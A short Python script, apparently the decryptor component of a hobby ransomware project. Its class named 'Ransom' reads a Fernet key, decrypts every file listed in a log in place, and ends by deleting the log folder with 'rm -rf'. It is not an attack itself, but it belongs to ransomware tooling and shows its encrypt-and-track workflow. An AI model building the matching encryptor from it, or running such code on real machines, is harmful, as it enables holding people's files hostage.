from cryptography.fernet import Fernet
from contextlib import suppress
import os, sys

#	DECRYPT

class Ransom:
	def __init__(self):
		try:
			with open("Key", 'rb') as f:
				self._key = f.read() 	#Fernet.generate_key()
		except:
			sys.exit("[!] KEY NOT FOUND")
		self._logs = "logs"
		self._path = self._logs+"/path.txt"
		self._count = 0

	def Decrypt(self, filename):
		F = Fernet(self._key)
		with open(filename, "rb") as file:
			encrypted_data = file.read()
		decrypted_data = F.decrypt(encrypted_data)
		with open(filename, "wb") as file:
			file.write(decrypted_data)

	def Unlock(self):
		with open(self._path) as fp:
			line = fp.readline()
			while line:
				self._count += 1
				filename = line.strip()
				with suppress(Exception):
					self.Decrypt(filename)
				print(f"\n[{self._count}] DECRYPTING FILES...", end="\r")
				line = fp.readline()
		print(f"\n[{self._count}] FILES SUCCESSFULLY DECRYPTED!\n")
		os.system(f'rm -rf {self._logs}')




if __name__ == "__main__":
	ransom = Ransom()
	ransom.Unlock()